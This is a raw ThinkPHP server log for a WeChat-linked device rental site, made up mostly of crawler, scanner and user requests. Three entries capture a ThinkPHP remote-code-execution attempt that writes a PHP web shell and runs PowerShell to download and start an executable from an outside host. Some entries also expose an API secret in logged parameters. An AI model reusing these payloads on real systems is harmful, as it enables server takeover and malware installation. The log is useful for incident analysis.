---------------------------------------------------------------
[2019-06-04T00:53:49+08:00] 101.132.103.15 POST 39.96.87.22//cc.php
[运行时间：0.015088s] [吞吐率：66.28req/s] [内存消耗：1,730.66kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T00:56:36+08:00] 47.100.1.198 GET 39.96.87.22/
[运行时间：0.015812s] [吞吐率：63.24req/s] [内存消耗：1,984.44kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T01:09:49+08:00] 165.22.36.84 HEAD 39.96.87.22/
[运行时间：0.016525s] [吞吐率：60.51req/s] [内存消耗：1,984.88kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-language' => 'en-gb,en;q=0.5',
  'accept' => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'identity',
  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
  'accept-charset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T02:29:33+08:00] 88.247.32.215 GET 39.96.87.22:80/
[运行时间：0.016351s] [吞吐率：61.16req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T02:37:04+08:00] 34.220.145.34 GET 39.96.87.22/
[运行时间：0.016447s] [吞吐率：60.80req/s] [内存消耗：1,984.45kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T02:58:51+08:00] 112.124.202.139 GET www.csgxjk.com/
[运行时间：0.016620s] [吞吐率：60.17req/s] [内存消耗：1,984.28kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => 'www.csgxjk.com',
  'accept-language' => 'zh-cn,en-us;q=0.5',
  'accept' => '*/*',
  'user-agent' => 'Baiduspider+(+http://www.baidu.com/search/spider.htm)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T03:36:00+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.014887s] [吞吐率：67.17req/s] [内存消耗：1,730.33kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T03:44:05+08:00] 81.211.44.50 GET 39.96.87.22:80/
[运行时间：0.015694s] [吞吐率：63.72req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T04:13:52+08:00] 120.132.3.65 GET www.qq.com/404/search_children.js
[运行时间：0.015590s] [吞吐率：64.14req/s] [内存消耗：1,730.34kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T04:21:08+08:00] 183.136.190.62 GET csgxjk.com/
[运行时间：0.016364s] [吞吐率：61.11req/s] [内存消耗：1,985.20kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept-encoding' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T04:22:14+08:00] 93.78.215.39 GET 39.96.87.22/.git/HEAD
[运行时间：0.015697s] [吞吐率：63.71req/s] [内存消耗：1,730.35kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T06:13:59+08:00] 178.164.164.33 GET csgxjk.com/
[运行时间：0.016994s] [吞吐率：58.84req/s] [内存消耗：1,985.14kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'content-language' => 'en-US',
  'referer' => 'https://brandnewblogs.com/site-browser/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T06:13:59+08:00] 178.164.164.33 GET csgxjk.com/
[运行时间：0.015959s] [吞吐率：62.66req/s] [内存消耗：1,985.14kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'content-language' => 'en-US',
  'referer' => 'https://brandnewblogs.com/site-browser/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T06:13:59+08:00] 178.164.164.33 GET csgxjk.com/
[运行时间：0.015710s] [吞吐率：63.65req/s] [内存消耗：1,985.14kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'content-language' => 'en-US',
  'referer' => 'https://brandnewblogs.com/site-browser/',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T06:40:26+08:00] 59.36.132.222 GET www.baidu.com/
[运行时间：0.016392s] [吞吐率：61.01req/s] [内存消耗：1,984.25kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'proxy-connection' => 'Keep-Alive',
  'accept' => '*/*',
  'user-agent' => 'curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0zlib/1.2.3 libidn/1.18 libssh2/1.2.2',
  'host' => 'www.baidu.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T06:43:39+08:00] 46.1.168.254 GET 39.96.87.22:80/
[运行时间：0.015877s] [吞吐率：62.98req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T06:49:31+08:00] 62.210.123.127 GET csgxjk.com/wp-login.php
[运行时间：0.014968s] [吞吐率：66.81req/s] [内存消耗：1,730.32kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T07:00:54+08:00] 120.25.208.128 GET www.csgxjk.com/
[运行时间：0.017815s] [吞吐率：56.13req/s] [内存消耗：1,984.43kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'host' => 'www.csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T07:42:19+08:00] 194.208.93.38 GET 39.96.87.22:80/
[运行时间：0.016330s] [吞吐率：61.24req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T07:45:54+08:00] 139.224.15.159 GET www.csgxjk.com/
[运行时间：0.016867s] [吞吐率：59.29req/s] [内存消耗：1,984.43kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T07:49:33+08:00] 106.15.201.111 GET csgxjk.com/
[运行时间：0.016025s] [吞吐率：62.40req/s] [内存消耗：1,984.40kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T08:17:19+08:00] 95.213.177.126 POST check.proxyradar.com/azenv.php?auth=155960743911&a=PSCN&i=660625174&p=80
[运行时间：0.015736s] [吞吐率：63.55req/s] [内存消耗：1,730.60kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T08:37:00+08:00] 200.60.118.75 GET 39.96.87.22:80/
[运行时间：0.016819s] [吞吐率：59.46req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T09:14:30+08:00] 212.41.48.67 GET 39.96.87.22:80/
[运行时间：0.016616s] [吞吐率：60.18req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T09:20:57+08:00] 23.239.4.28 GET 39.96.87.22/
[运行时间：0.017275s] [吞吐率：57.89req/s] [内存消耗：1,984.03kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T10:07:19+08:00] 202.191.125.242 GET 39.96.87.22:80/
[运行时间：0.016743s] [吞吐率：59.73req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T10:45:04+08:00] 31.192.80.102 GET 39.96.87.22:80/
[运行时间：0.015982s] [吞吐率：62.57req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T11:27:05+08:00] 106.2.124.185 GET baidu.com/
[运行时间：0.017022s] [吞吐率：58.75req/s] [内存消耗：1,984.27kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'proxy-connection' => 'Keep-Alive',
  'host' => 'baidu.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T13:16:19+08:00] 218.94.13.62 GET 39.96.87.22/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/wvfcyxjdjzsogow6412.exe');start%20%SystemRoot%/Temp/wvfcyxjdjzsogow6412.exe
[运行时间：0.014916s] [吞吐率：67.04req/s] [内存消耗：1,708.62kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T13:16:19+08:00] 218.94.13.62 GET 39.96.87.22/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
[运行时间：0.014444s] [吞吐率：69.23req/s] [内存消耗：1,708.67kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T13:16:19+08:00] 218.94.13.62 GET 39.96.87.22/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/wvfcyxjdjzsogow6412.exe');start%20%SystemRoot%/Temp/wvfcyxjdjzsogow6412.exe
[运行时间：0.014287s] [吞吐率：69.99req/s] [内存消耗：1,730.74kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-06-04T14:28:22+08:00] 207.154.216.244 GET 39.96.87.22/
[运行时间：0.016455s] [吞吐率：60.77req/s] [内存消耗：1,984.26kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T14:44:42+08:00] 115.171.245.110 GET csgxjk.com/wx/device/work/4
[运行时间：0.034824s] [吞吐率：28.72req/s] [内存消耗：3,849.16kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000498s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001400s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000372s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001013s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000324s ]
---------------------------------------------------------------
[2019-06-04T14:44:46+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.038852s] [吞吐率：25.74req/s] [内存消耗：3,229.48kb] [文件加载：87]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559630685',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '38e9a90d499822bd3ab17aebbbd465c2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000434s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001408s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000360s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `record_api` [ RunTime:0.001025s ]
[ sql ] [ SQL ] INSERT INTO `record_api` (`appid` , `devid` , `start_time` , `long`) VALUES (1 , 4 , 1559630686 , 600) [ RunTime:0.000293s ]
---------------------------------------------------------------
[2019-06-04T14:44:46+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.582769s] [吞吐率：1.72req/s] [内存消耗：3,704.71kb] [文件加载：135]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000473s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001361s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000324s ]
---------------------------------------------------------------
[2019-06-04T14:44:47+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.027906s] [吞吐率：35.83req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559630684',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => 'a23439afa1cab867ebfcf5b81c762648',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000472s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001354s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000368s ]
---------------------------------------------------------------
[2019-06-04T14:44:47+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：2.571644s] [吞吐率：0.39req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000436s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001355s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000325s ]
---------------------------------------------------------------
[2019-06-04T14:45:41+08:00] 61.151.178.177 GET csgxjk.com/wx/device/work/4
[运行时间：0.033903s] [吞吐率：29.50req/s] [内存消耗：3,847.41kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en',
  'content-type' => '',
  'content-length' => '',
)
